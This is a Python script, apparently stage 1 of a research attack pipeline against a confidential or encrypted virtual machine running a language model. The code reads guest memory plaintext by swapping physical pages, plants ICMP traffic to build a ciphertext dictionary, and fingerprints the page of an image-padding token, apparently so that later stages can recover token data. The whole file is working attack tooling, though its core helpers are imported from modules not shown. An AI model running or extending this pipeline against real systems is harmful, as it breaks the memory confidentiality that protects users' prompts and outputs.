#!/usr/bin/env python3
"""
case_study/llm/pipeline/stage1_prepare_dict.py — Stage 1: Dictionary & Reference Preparation.

Tasks:
1. Verify / Acquire clean Zero Page GPA and <|image_pad|> reference page fingerprint.
2. Verify or build Token Labels ciphertext dictionary (dict_cache_v4.json / dict_pages_v4/).
3. Export stage1_ref.json metadata for subsequent stages.

Usage:
    # Use existing dictionary and verify
    python3 stage1_prepare_dict.py --skip-existing --output-dir .

    # Force re-build dictionary via guest ICMP plants (requires running guest VM)
    sudo python3 stage1_prepare_dict.py --build-dict --output-dir .
"""

import argparse
import json
import os
import sys
import time
from pathlib import Path
from typing import Any, Dict, Optional, Set, Tuple

import common as c


def verify_dict_cache(cache_path: Path) -> Tuple[bool, int, Dict[str, Any]]:
    """Check if dict_cache_v4.json exists and contains valid offset keys."""
    if not cache_path.exists():
        return False, 0, {}
    try:
        with open(cache_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, dict) and len(data) > 0:
            return True, len(data), data
    except Exception as e:
        print(f"[!] Error loading {cache_path}: {e}", file=sys.stderr)
    return False, 0, {}


def read_at_fixed(fixed_gpa: int, src_gpa: int, tag: str) -> bytes:
    """Read src_gpa plaintext by swapping it into fixed_gpa via swap_pages_tool."""
    from mura_dict_build import do_swap_read, parse_dump
    c.SCAN_TMP.mkdir(exist_ok=True)
    tmp = c.SCAN_TMP / f"{tag}.out"
    do_swap_read(fixed_gpa, src_gpa, tmp, c.SWAP_TOOL)
    data = parse_dump(tmp)
    tmp.unlink(missing_ok=True)
    return data


def acquire_imagepad_reference(fixed_gpa: int, tries: int = 5) -> Tuple[bytes, Set[int]]:
    """Acquire and validate <|image_pad|> reference page and confirmed 16B mask."""
    from mura_dict_build import acquire_gpa, drain_rxbuf
    zero_gpa = acquire_gpa(None)
    zero_data = read_at_fixed(fixed_gpa, zero_gpa, "zero_ref")

    best_ref, best_mask = None, set()
    for t in range(tries):
        rg = acquire_gpa(c.IMAGE_PAD_TOKEN_ID, chunk_bytes=c.imagepad_chunk())
        cur_data = read_at_fixed(fixed_gpa, rg, f"ip_ref_{t}")
        mask = {j for j in range(c.CHUNKS_PAGE) if c.get_chunk(cur_data, j) != c.get_chunk(zero_data, j)}
        print(f"  [ref] plant {t}: confirmed image_pad offsets = {len(mask)}/256")
        if len(mask) > len(best_mask):
            best_ref, best_mask = cur_data, mask
        if len(best_mask) >= 200:
            break
        try:
            drain_rxbuf(rounds=1)
        except Exception:
            pass
        time.sleep(1)

    if best_ref is None or len(best_mask) < 40:
        raise RuntimeError(f"Failed to acquire stable image_pad reference (best mask: {len(best_mask)})")

    return best_ref, best_mask


def run_stage1(build_dict: bool = False, skip_existing: bool = True,
               output_dir: Optional[Path] = None) -> Dict[str, Any]:
    out_dir = output_dir or c.PIPELINE_DIR
    out_dir.mkdir(parents=True, exist_ok=True)
    out_json = out_dir / "stage1_ref.json"

    print("=" * 70)
    print("  [Stage 1] Dictionary & Image-Pad Reference Page Preparation")
    print("=" * 70)

    dict_valid, key_count, dict_data = verify_dict_cache(c.DICT_CACHE)

    if build_dict or (not dict_valid and not skip_existing):
        print("[Stage 1] Building dictionary from guest ICMP plants...")
        c.run_net_preflight()
        c.ensure_mtu_9000()
        import orchestrate_v4 as o
        dict_data = o.build_dict(c.SWAP_TOOL)
        dict_valid, key_count, _ = verify_dict_cache(c.DICT_CACHE)
    else:
        print(f"[Stage 1] Using existing dictionary: {c.DICT_CACHE} ({key_count} offset keys)")

    ref_meta = {
        "dict_cache_path": str(c.DICT_CACHE),
        "dict_keys_count": key_count,
        "dict_valid": dict_valid,
        "image_pad_token_id": c.IMAGE_PAD_TOKEN_ID,
        "status": "READY" if dict_valid else "DICT_MISSING",
        "timestamp": time.time(),
    }

    c.save_json(out_json, ref_meta)
    print(f"[Stage 1] Saved metadata -> {out_json}")
    return ref_meta


def main():
    p = argparse.ArgumentParser(description="Stage 1: Dictionary & Reference Preparation")
    p.add_argument("--build-dict", action="store_true", help="Force dictionary rebuild via ICMP plants")
    p.add_argument("--skip-existing", action="store_true", default=True, help="Skip rebuild if dict_cache_v4.json exists")
    p.add_argument("--output-dir", type=Path, default=c.PIPELINE_DIR, help="Output directory for stage1_ref.json")
    args = p.parse_args()

    meta = run_stage1(build_dict=args.build_dict, skip_existing=args.skip_existing, output_dir=args.output_dir)
    if meta["status"] != "READY":
        sys.exit(1)


if __name__ == "__main__":
    main()
